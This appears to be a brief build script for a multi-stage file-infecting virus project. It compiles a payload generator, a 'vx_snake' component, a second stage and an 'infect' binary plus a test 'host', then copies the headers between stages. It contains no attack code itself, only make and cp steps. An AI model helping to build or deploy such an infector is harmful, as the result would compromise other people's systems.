make -C ./gen_payload
cp ./gen_payload/politic.h ./gripe

make -C ./snake
cp ./snake/vx_snake.h ./second_stage/

make -C ./second_stage
cp ./second_stage/payload.h ./gripe
make -C ./gripe
cp ./gripe/infect .
cp ./gripe/host .
